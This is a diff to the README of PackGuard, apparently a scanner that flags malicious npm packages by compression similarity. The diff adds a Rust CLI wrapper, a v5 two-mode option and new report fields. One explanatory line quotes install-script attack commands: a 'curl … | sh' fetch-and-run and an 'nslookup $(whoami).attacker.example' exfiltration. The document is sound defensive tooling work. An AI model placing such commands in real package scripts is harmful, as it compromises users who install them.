@@ -57,6 +57,7 @@ PackGuard/
 │   └── ai_filter.c / .h        # Stage 2 inference (ONNX Runtime C API), planned
 ├── training/
 │   └── finetune_packguard.py   # Stage 2 fine-tuning (Hugging Face), planned
+├── frontend/                   # Rust CLI/TUI wrapper around the C scanner
 ├── data/v1/malware_js_*.zip    # v1 malware set, 16 encrypted zips, see dataset_index.md
 ├── data/v2/malware_js_*.zip    # v2 malware set (install scripts, tuned ratio), 16 encrypted zips
 ├── tests/                      # Test inputs and outputs, one folder per function
@@ -64,6 +65,7 @@ PackGuard/
 ├── experiments/v2/             # v2 dataset builder and examples-per-family ratio experiment
 ├── experiments/v3/             # v3 stage-1 accuracy: tiny chunks, boilerplate, script threshold
 ├── experiments/v4/             # v4 renamed/mangled benchmark: T1-T4 transforms, results
+├── experiments/v5/             # v5 two-mode design: known v4c2 mode and new-campaign mode
 ├── docs/                       # Design notes and stage-1 suggestions
 ├── scripts/build-windows.ps1   # Native Windows build (zig + static liblzma)
 ├── Makefile                    # Linux/macOS build
@@ -138,13 +140,15 @@ docker run --rm --network none -v "$PWD/refs:/refs:ro" -v "$PWD/samples:/work:ro
 ### Run a scan
 
 ```bash
-build/packguard [-j threads] [-p candidates] [-m bytes] [-b 0|1] [-c 0|1|2] \
-                [-n 0|1] [-e 0|1] [-t threshold] [-s script_threshold] [-k groups] \
-                [-o report.json | -d report_dir] <reference_dir> <package_path>...
+build/packguard [--mode known|new] [-j threads] [-p candidates] [-m bytes] [-b 0|1] \
+                [-c 0|1|2] [-n 0|1] [-e 0|1] [-t threshold] [-s script_threshold] \
+                [-k groups] [-o report.json | -d report_dir] \
+                <reference_dir> <package_path>...
 ```
 
 | Option | Meaning |
 |---|---|
+| `--mode` | `known` uses the v4c2 views/chunking with JavaScript threshold 0.62 and install-script threshold 0.50; `new` uses raw NCD plus behavioural primitives, no normalised view, at 0.50. Stage 2 filters the false alarms. |
 | `-j` | Worker threads, started once per run (default: all logical processors) |
 | `-p` | LZJD prefilter: run NCD only on this many most similar reference chunks per chunk (default 256; `0` scores every reference, the exact brute-force mode) |
 | `-m` | Leave JavaScript chunks shorter than this many bytes out of the package score (default 256; `0` scores every chunk) |
@@ -159,6 +163,19 @@ build/packguard [-j threads] [-p candidates] [-m bytes] [-b 0|1] [-c 0|1|2] \
 | `-d` | Write one report per package to `report_dir/<package folder>.json` |
 
 The references are loaded and their C(x) cached once, then every package is scanned in turn, so many packages per run is much faster than one run per package. Byte-identical reference chunks are scored once: v1 has 190,939 chunks but only 69,249 distinct ones, and this never changes a score. Exit status is 0 on success, 1 if any package failed and 2 for a usage error.
+
+**v5 modes.** `--mode known` uses the v4c2 views and chunking (raw + normalised, CDC on the normalised view) with JavaScript threshold 0.62 and install-script threshold 0.50. `--mode new` is the new-campaign path: it scores the raw view, adds an install-script/JavaScript behavioural-primitive flag, and does not load the normalised view, at 0.50. Stage 2 is built and filters false alarms. Full v5 results and the tuning recommendation are in [`experiments/v5/`](experiments/v5/README.md).
+
+**Rust CLI/TUI.** [`frontend/`](frontend/README.md) is a small Rust wrapper. It runs the C scanner with the selected mode, reads the JSON reports, and prints a ranked table; `--tui` opens a simple interactive menu.
+
+```bash
+cd frontend
+cargo build --release
+./target/release/packguard-cli --mode new --refs <reference_dir> --scan-dir <package_dir>
+./target/release/packguard-cli --tui --packguard ../build/packguard
+```
+
+The C scanner must be built first. On Windows use `packguard.exe` and scan only benign code; malware stays inside WSL. The wrapper does not implement detection itself.
 
 **Install scripts.** Many malicious packages carry their whole attack in `package.json`, as a `preinstall`, `install` or `postinstall` command (`curl … | sh`, `nslookup $(whoami).attacker.example`). The scanner reads the `package.json` at the package root, keeps only those three commands, one per line, and scores that text like any other file (it appears as `package.json` in the report). A `package.json` deeper in the package is skipped, since npm never runs its scripts. Reference sets keep no `package.json`; they store the same text as `install_scripts.txt`, which the scanner reads whole.
 
@@ -227,7 +244,7 @@ The scanner writes one JSON file per package, which stage 2 reads:
 }
 ```
 
-Lower `ncd` = more similar to known malware. `match` is the closest reference chunk and the reference package it belongs to (the second folder below `reference_dir`, `<package>@<version>` in v1). `matched_packages` lists every reference package that was the closest match of at least one non-ignored chunk, with its code-shape group, its lowest NCD and how many chunks matched it, closest first. `threshold` and `flagged` appear only with `-t`, and `near` only with `-k`. With `-n`, the report also writes `score_raw`, `score_normalized`, `score_view` (`raw` or `normalized`) and `normalized_match` (the closest normalised reference chunk), and `score` is the lower of the two views. `score` is the lowest NCD among the chunks that were not ignored, and `null` when a package has no JavaScript and no install scripts. `flagged` is not `score <= threshold`: it is true when **any** non-ignored chunk is at or below its own threshold, so an install-script chunk is judged against `-s` (default 0.45) and every other chunk against `-t`. A JavaScript chunk shorter than `-m` is still in `chunks` with `"ignored": true`, but does not set `score`, does not appear in `matched_packages` and does not set the package `flagged`; when every chunk is ignored, the largest one sets the score and `"low_confidence": true` appears at the top. `kind` is `js`, `install_script` or `other`. For `package.json`, `text` is its install-script commands, not the whole file. `text` is the chunk as UTF-8, with bytes that are not valid UTF-8 written as U+FFFD.
+Lower `ncd` = more similar to known malware. `match` is the closest reference chunk and the reference package it belongs to (the second folder below `reference_dir`, `<package>@<version>` in v1). `matched_packages` lists every reference package that was the closest match of at least one non-ignored chunk, with its code-shape group, its lowest NCD and how many chunks matched it, closest first. `threshold` and `flagged` appear only with `-t`, and `near` only with `-k`. With `-n`, the report also writes `score_raw`, `score_normalized`, `score_view` (`raw` or `normalized`) and `normalized_match` (the closest normalised reference chunk), and `score` is the lower of the two views. With `--mode new`, the report adds `primitive_score`, `primitive_flagged` and `primitive_hits`; `flagged` is then the OR of the NCD rule and the primitive rule. `score` is the lowest NCD among the chunks that were not ignored, and `null` when a package has no JavaScript and no install scripts. `flagged` is not `score <= threshold`: it is true when **any** non-ignored chunk is at or below its own threshold, so an install-script chunk is judged against `-s` (default 0.45) and every other chunk against `-t`. A JavaScript chunk shorter than `-m` is still in `chunks` with `"ignored": true`, but does not set `score`, does not appear in `matched_packages` and does not set the package `flagged`; when every chunk is ignored, the largest one sets the score and `"low_confidence": true` appears at the top. `kind` is `js`, `install_script` or `other`. For `package.json`, `text` is its install-script commands, not the whole file. `text` is the chunk as UTF-8, with bytes that are not valid UTF-8 written as U+FFFD.
 
 ## Default configuration (v1 and v4)
 
